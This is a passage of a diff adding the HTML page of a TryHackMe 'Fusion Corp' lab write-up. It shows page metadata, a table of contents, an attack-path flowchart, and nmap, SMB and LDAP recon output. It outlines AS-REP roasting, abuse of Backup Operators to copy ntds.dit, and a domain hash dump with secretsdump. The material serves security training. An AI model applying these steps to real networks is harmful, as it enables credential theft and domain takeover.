@@ -1,0 +1,2429 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - Fusion Corp WriteUp | 0xblivion.dev</title>
+<meta name="keywords" content="TryHackMe, FusionCorp, Writeup, Walkthrough, ActiveDirectory, AS-REP Roasting, Kerberos, Backup Operators, NTDS.DIT, SYSTEM Hives, secretsdump, Evil-WinRM, Windows">
+<meta name="description" content="Overview
+
+Fusion corp is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, lparker, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.
+From there, post-exploitation enumeration reveals another user, jmurphy, with their password stored in the user account&rsquo;s comment field. This user is a member of the Backup Operators group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the ntds.dit and SYSTEM hives. Finally, we use secretsdump.py to dump all the domain hashes, get the administrator&rsquo;s hash, and use it to get the final flag.">
+<meta name="author" content="0xblivion">
+<link rel="canonical" href="https://0xblivion.dev/posts/thm/windows/hard/tryhackme-fusion-corp-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7bb9e509f32b776e3778b3ea8539776721782bd73f8019534361265046bfd155.css" integrity="sha256-e7nlCfMrd243eLPqhTl3ZyF4K9c/gBlTQ2EmUEa/0VU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://0xblivion.dev/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xblivion.dev/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xblivion.dev/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xblivion.dev/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xblivion.dev/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://0xblivion.dev/posts/thm/windows/hard/tryhackme-fusion-corp-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://0xblivion.dev/posts/thm/windows/hard/tryhackme-fusion-corp-writeup/">
+  <meta property="og:site_name" content="0xblivion.dev">
+  <meta property="og:title" content="TryHackMe - Fusion Corp WriteUp">
+  <meta property="og:description" content="Overview Fusion corp is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, lparker, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.
+From there, post-exploitation enumeration reveals another user, jmurphy, with their password stored in the user account’s comment field. This user is a member of the Backup Operators group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the ntds.dit and SYSTEM hives. Finally, we use secretsdump.py to dump all the domain hashes, get the administrator’s hash, and use it to get the final flag.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-11T00:00:00+00:00">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="FusionCorp">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="AS-REP Roasting">
+    <meta property="og:image" content="https://0xblivion.dev/img/FusionCorp/fusionCard.jpeg">
+  
+  <meta name="author" content="0xblivion">
+  <meta property="article:author" content="0xblivion">
+  <meta property="og:article:author" content="0xblivion">
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "author": {
+        "@type": "Person",
+        "name": "0xblivion"
+      }
+    }
+  </script>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0xblivion.dev/img/FusionCorp/fusionCard.jpeg">
+<meta name="twitter:title" content="TryHackMe - Fusion Corp WriteUp">
+<meta name="twitter:description" content="Overview
+
+Fusion corp is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, lparker, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.
+From there, post-exploitation enumeration reveals another user, jmurphy, with their password stored in the user account&rsquo;s comment field. This user is a member of the Backup Operators group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the ntds.dit and SYSTEM hives. Finally, we use secretsdump.py to dump all the domain hashes, get the administrator&rsquo;s hash, and use it to get the final flag.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xblivion.dev/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - Fusion Corp WriteUp",
+      "item": "https://0xblivion.dev/posts/thm/windows/hard/tryhackme-fusion-corp-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - Fusion Corp WriteUp",
+  "name": "TryHackMe - Fusion Corp WriteUp",
+  "description": "Overview Fusion corp is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, lparker, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.\nFrom there, post-exploitation enumeration reveals another user, jmurphy, with their password stored in the user account\u0026rsquo;s comment field. This user is a member of the Backup Operators group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the ntds.dit and SYSTEM hives. Finally, we use secretsdump.py to dump all the domain hashes, get the administrator\u0026rsquo;s hash, and use it to get the final flag.\n",
+  "keywords": [
+    "TryHackMe", "FusionCorp", "Writeup", "Walkthrough", "ActiveDirectory", "AS-REP Roasting", "Kerberos", "Backup Operators", "NTDS.DIT", "SYSTEM Hives", "secretsdump", "Evil-WinRM", "Windows"
+  ],
+  "articleBody": "Overview Fusion corp is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, lparker, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.\nFrom there, post-exploitation enumeration reveals another user, jmurphy, with their password stored in the user account’s comment field. This user is a member of the Backup Operators group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the ntds.dit and SYSTEM hives. Finally, we use secretsdump.py to dump all the domain hashes, get the administrator’s hash, and use it to get the final flag.\nTarget IP 10.10.114.232 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Check Web (Static Page) [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Fuzz Directories → Found /backup/ [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access /backup/ → Found employees.ods [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract Usernames from employees.ods [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]AS-REP Roasting (lparker) → Crack Hash with Hashcat [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as lparker via Evil-WinRM [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Enumerate Users (net user) → Find jmurphy [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Extract jmurphy's password from comment field [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as jmurphy via Evil-WinRM [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Abuse Backup Operators (Volume Shadow Copy) [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Create Shadow Copy (DiskShadow) [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Copy ntds.dit, SYSTEM.SAV, SAM.SAV [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Setup SMB server to Exfiltrate Files [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Dump Domain Hashes → Get Administrator Hash [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Login as Administrator via Evil-WinRM 1. Reconnaissance (TA0043) 1.1. Network Scanning (T1595) As always, we kick things off with an nmap scan to see what we’re up against. 0xblivion@fusionCorp: ~ root@localhost:~# sudo nmap -sVC -oA nmap/fusioncorp 10.10.114.232 -vv # Nmap 7.95 scan initiated Thu Jul 10 16:24:00 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/fusioncorp -vv 10.10.114.232 Nmap scan report for 10.10.114.232 Host is up, received echo-reply ttl 125 (0.15s latency). Scanned at 2025-07-10 16:24:01 EDT for 69s Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34 |_http-server-header: Microsoft-IIS/10.0 |_http-title: eBusiness Bootstrap Template | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-10 20:24:17Z) 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 3268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 125 3389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: FUSION | NetBIOS_Domain_Name: FUSION | NetBIOS_Computer_Name: FUSION-DC | DNS_Domain_Name: fusion.corp | DNS_Computer_Name: Fusion-DC.fusion.corp | Product_Version: 10.0.17763 |_ System_Time: 2025-07-10T20:24:27+00:00 | ssl-cert: Subject: commonName=Fusion-DC.fusion.corp | Issuer: commonName=Fusion-DC.fusion.corp | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-09T20:23:17 | Not valid after: 2026-01-08T20:23:17 | MD5: 9bb5:816c:19a4:ded2:25ce:fadf:aa7c:6862 | SHA-1: 97a5:6d31:335b:799f:32c3:ca9b:4a99:c8c7:8c23:92a5 | -----BEGIN CERTIFICATE----- | MIIC7jCCAdagAwIBAgIQcRL/M8rGsoBMcOvpYGK3CTANBgkqhkiG9w0BAQsFADAg | MR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNvcnAwHhcNMjUwNzA5MjAyMzE3 | WhcNMjYwMTA4MjAyMzE3WjAgMR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNv | cnAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDpAnEjtv/u25XgKvVm | I9NWSgdwdJLwtgC9oLMZQcEwhZ2hWNYMhHsaf7JC1NYxUW4k5wf2bpsCkx7hLZs2 | aaVGnAjNoBMznkfIu/goDkkFRA7IwW7vzFOs6Wqc+sxRYcJvcZWaq/hXtUoam85l | TNhYUFrfjATkhgPpqGKUi0WBVqfw/Gcdt3KIlvTAauY3q2Ft6YtL+A4S+QgEYF6N | qMnJ2kODWuCKRwqqUEX6d4/DTUXoAQIgGZzudi/WYVOkg39dd2LT0DS7wiRZydr5 | XGr9+ge71mf9yk5ge6JHEdFgEJayAukksHtK97tziuoLmCANLt7b+bZL++1VpFCu | 6LJhAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN | BgkqhkiG9w0BAQsFAAOCAQEAKZv4p8/eX82nKg7TCL9N5XfJ44BpBtPIHqghEYS+ | FxzjdKVUgxbdod8Rb6Wqoq6f3lw81mYhG3vixEkcQmEtp10gScWbdScTV+EB0J2C | bZCUBZus8m4HdD+BGbWW61/k6iF0hdTJUvvb3kyWn4Ed6Y79bvXkKjuEmEgvJcmD | iFjmhQYH+eMrwaWPCsSLYcHAzh9OoVQZHx5n7HNNAb2rvFBywUYTS7StQQZTl3v0 | CaMeZlmiyOvzxqjsrE/CkVA3Xgk04P7vrlv0Vqn3Ka29FpdVuluLQMN64OpnYVEA | XLC+kuRLfSVxyBK4z64aNa/MDvCKv2m58U4kzXo/DSZqAw== |_-----END CERTIFICATE----- |_ssl-date: 2025-07-10T20:25:06+00:00; 0s from scanner time. Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 0s, deviation: 0s, median: 0s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 14125/tcp): CLEAN (Timeout) | Check 2 (port 14414/tcp): CLEAN (Timeout) | Check 3 (port 42015/udp): CLEAN (Timeout) | Check 4 (port 12722/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2025-07-10T20:24:27 |_ start_date: N/A Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 10 16:25:10 2025 -- 1 IP address (1 host up) scanned in 69.56 seconds copy The scan reveals common ports for an Active Directory environment. The rdp-ntlm-info NSE script gives us the domain name (fusion.corp), the hostname (FUSION-DC), and the FQDN (Fusion-DC.fusion.corp). Port 80 is also open.\nLet’s add that to our hosts file: 0xblivion@fusionCorp: ~ root@localhost:~# echo \"10.10.27.194 Fusion-DC.fusion.corp FUSION-DC fusion.corp\" | sudo tee -a /etc/hosts 10.10.27.194 Fusion-DC.fusion.corp FUSION-DC fusion.corp copy Note: You should put the FQDN first before anything else, to avoid any DNS issues. (That’s what I learn on the previous writeup Crocc Crew) 1.2. Anonymous Authentication Checks Without credentials, we can’t do anything. So let’s try basic unauthenticated checks first before diving into the web stuff. First, I will try smb null authentication:\n0xblivion@fusionCorp: ~ root@localhost:~# nxc smb $target -u '' -p '' --shares SMB 10.10.27.194 445 FUSION-DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False) SMB 10.10.27.194 445 FUSION-DC [+] fusion.corp\\: SMB 10.10.27.194 445 FUSION-DC [-] Error enumerating shares: STATUS_ACCESS_DENIED copy We can authenticate but we can’t list the shares. Next, I’ll try an anonymous bind against LDAP to see if I can dump any information about the domain structure:\n0xblivion@fusionCorp: ~ root@localhost:~# ldapsearch -x -H ldap://$target -s base namingcontexts # extended LDIF # # LDAPv3 # base \u003c\u003e (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=fusion,DC=corp namingcontexts: CN=Configuration,DC=fusion,DC=corp namingcontexts: CN=Schema,CN=Configuration,DC=fusion,DC=corp namingcontexts: DC=DomainDnsZones,DC=fusion,DC=corp namingcontexts: DC=ForestDnsZones,DC=fusion,DC=corp # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 root@localhost:~# ldapsearch -x -H ldap://$target -b 'DC=fusion,DC=corp' # extended LDIF # # LDAPv3 # base ",
+  "wordCount" : "932",
+  "inLanguage": "en",
+  "image":"https://0xblivion.dev/img/FusionCorp/fusionCard.jpeg","datePublished": "2025-07-11T00:00:00Z",
+  "dateModified": "2025-07-11T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "0xblivion"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xblivion.dev/posts/thm/windows/hard/tryhackme-fusion-corp-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xblivion.dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xblivion.dev/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xblivion.dev/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xblivion.dev/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xblivion.dev/">Home</a>&nbsp;»&nbsp;<a href="https://0xblivion.dev/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      TryHackMe - Fusion Corp WriteUp
+    </h1>
+    <div class="post-meta"><span title='2025-07-11 00:00:00 +0000 UTC'>July 11, 2025</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;0xblivion
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#1-reconnaissance-ta0043" aria-label="1. Reconnaissance (TA0043)">1. Reconnaissance (TA0043)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#11-network-scanning-t1595" aria-label="1.1. Network Scanning (T1595)">1.1. Network Scanning (T1595)</a></li>
+                <li>
+                    <a href="#12-anonymous-authentication-checks" aria-label="1.2. Anonymous Authentication Checks">1.2. Anonymous Authentication Checks</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#2-initial-access-ta0001" aria-label="2. Initial Access (TA0001)">2. Initial Access (TA0001)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#21-web-enumeration-and-user-discovery-t1593" aria-label="2.1. Web Enumeration and User Discovery (T1593)">2.1. Web Enumeration and User Discovery (T1593)</a></li>
+                <li>
+                    <a href="#22-as-rep-roasting-t1558004" aria-label="2.2. AS-REP Roasting (T1558.004)">2.2. AS-REP Roasting (T1558.004)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#3-privilege-escalation-ta0004" aria-label="3. Privilege Escalation (TA0004)">3. Privilege Escalation (TA0004)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#31-user-enumeration-and-discovery" aria-label="3.1. User Enumeration and Discovery">3.1. User Enumeration and Discovery</a></li>
+                <li>
+                    <a href="#32-abusing-backup-operators-t1565001" aria-label="3.2. Abusing Backup Operators (T1565.001)">3.2. Abusing Backup Operators (T1565.001)</a></li>
+                <li>
+                    <a href="#33-dumping-domain-hashes-t1003003" aria-label="3.3. Dumping Domain Hashes (T1003.003)">3.3. Dumping Domain Hashes (T1003.003)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#4-beyond-root" aria-label="4. Beyond Root">4. Beyond Root</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#41-enabling-rdp" aria-label="4.1. Enabling RDP">4.1. Enabling RDP</a></li>
+                <li>
+                    <a href="#42-system-information" aria-label="4.2. System Information">4.2. System Information</a></li>
+                <li>
+                    <a href="#43-vulnerabilities" aria-label="4.3. Vulnerabilities">4.3. Vulnerabilities</a></li>
+                <li>
+                    <a href="#44-windows-defender-exclusions" aria-label="4.4. Windows Defender Exclusions">4.4. Windows Defender Exclusions</a></li>
+                <li>
+                    <a href="#45-scheduled-tasks" aria-label="4.5. Scheduled Tasks">4.5. Scheduled Tasks</a>
+                </li>
+            </ul>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
+<p><img src="/img/FusionCorp/Fusion.png" alt="" class="img-responsive" loading="lazy" />
+<code>Fusion corp</code> is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, <code>lparker</code>, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.</p>
+<p>From there, post-exploitation enumeration reveals another user, <code>jmurphy</code>, with their password stored in the user account&rsquo;s comment field. This user is a member of the <code>Backup Operators</code> group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the <code>ntds.dit</code> and <code>SYSTEM</code> hives. Finally, we use <code>secretsdump.py</code> to dump all the domain hashes, get the administrator&rsquo;s hash, and use it to get the final flag.</p>
+
+<div class="target-info">
+    <div class="target-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <circle cx="12" cy="12" r="6"/>
+            <circle cx="12" cy="12" r="2"/>
+        </svg>
+    </div>
+    <div class="target-details">
+        <div class="target-item">
+            <span class="target-label">Target IP</span>
+            <code class="ip-address">10.10.114.232</code>
+        </div>
+        
+    </div>
+</div>
+
+<style>
+.target-info {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    margin: 16px 0;
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+    border-left: 4px solid #9fef00;
+    border-radius: 8px;
+    font-family: system-ui, -apple-system, sans-serif;
+}
+
+.target-icon {
+    flex-shrink: 0;
+}
+
+.target-icon svg {
+    width: 20px;
+    height: 20px;
+    color: #9fef00;
+    display: block;
+}
+
+.target-details {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.target-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.creds-separator {
+    flex-shrink: 0;
+    opacity: 1;
+}
+
+.creds-separator svg {
+    width: 18px;
+    height: 18px;
+    color: #9fef00;
+    display: block;
+    stroke-width: 2.5;
+}
+
+.target-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #c9d1d9;
+    white-space: nowrap;
+}
+
+.ip-address, .credentials {
+    color: #9fef00;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: bold;
+    background: none !important;
+    background-color: transparent !important;
+    padding: 0 !important;
+    border: none !important;
+    border-radius: 0 !important;
+}
+</style>
+
+
+
+
+
+<div id="flowchart-1752251679525210966" class="attack-path-flowchart">
+  <div class="flowchart-controls">
+    <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
+    <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
+    <button class="zoom-btn" data-action="reset" title="Reset View">⌂</button>
+  </div>
+  <div class="flowchart-data" style="display: none;">
+[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan
+[https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Check Web (Static Page)
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Fuzz Directories → Found /backup/
+[https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access /backup/ → Found employees.ods
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract Usernames from employees.ods
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]AS-REP Roasting (lparker) → Crack Hash with Hashcat
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as lparker via Evil-WinRM
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Enumerate Users (net user) → Find jmurphy
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Extract jmurphy's password from comment field
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as jmurphy via Evil-WinRM
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Abuse Backup Operators (Volume Shadow Copy)
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Create Shadow Copy (DiskShadow)
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Copy ntds.dit, SYSTEM.SAV, SAM.SAV
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Setup SMB server to Exfiltrate Files
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Dump Domain Hashes → Get Administrator Hash
+[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Login as Administrator via Evil-WinRM 
+</div>
+</div>
+
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js" xintegrity="sha512-M1h0i4zB/nNoM+3TLA+q3EViN9yQ9LpIq6W2daLpZ1B13Y4YI3wE4F28M3aEfsyyHn5j2vAxw8U2tKjB6i/w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+
+
+<style>
+.attack-path-flowchart {
+  width: 100%;
+  height: 500px;
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 8px;
+  position: relative;
+  overflow: hidden;
+  margin: 2rem 0;
+}
+
+.flowchart-controls {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  z-index: 1000;
+  display: flex;
+  gap: 5px;
+}
+
+.zoom-btn {
+  width: 32px;
+  height: 32px;
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 4px;
+  color: #fff;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s ease;
+}
+
+.zoom-btn:hover {
+  background: rgba(0, 0, 0, 0.9);
+  border-color: rgba(255, 255, 255, 0.4);
+}
+
+.flowchart-svg {
+  width: 100%;
+  height: 100%;
+  background: transparent;
+  cursor: grab;
+}
+
+.flowchart-svg:active {
+  cursor: grabbing;
+}
+
+.flowchart-node {
+  cursor: pointer;
+}
+
+.flowchart-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 36px;
+  text-anchor: middle;
+  dominant-baseline: central;
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-image {
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-text {
+  font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  text-anchor: middle;
+  pointer-events: none;
+  user-select: none;
+  fill: #ddd;
+}
+
+.flowchart-arrow {
+  stroke: rgba(255, 255, 255, 0.4);
+  stroke-width: 1.5px;
+  transition: all 0.2s ease-in-out;
+}
+
+.flowchart-arrow.glow {
+  stroke: rgba(255, 255, 255, 1);
+  stroke-width: 2.5px;
+  filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.7));
+}
+
+.flowchart-arrow-marker {
+  fill: rgba(255, 255, 255, 0.6);
+}
+
+.flowchart-pin-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 16px;
+  fill: #DC143C;  
+  text-anchor: middle;
+  dominant-baseline: central;
+  display: none;  
+  pointer-events: none;
+  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));
+}
+
+
+ 
+.node-recon .flowchart-icon { color: #A0522D; }  
+.node-enum .flowchart-icon { color: #4169E1; }  
+.node-exploit .flowchart-icon { color: #DC143C; }  
+.node-access .flowchart-icon { color: #2E8B57; }  
+.node-privesc .flowchart-icon { color: #FF8C00; }  
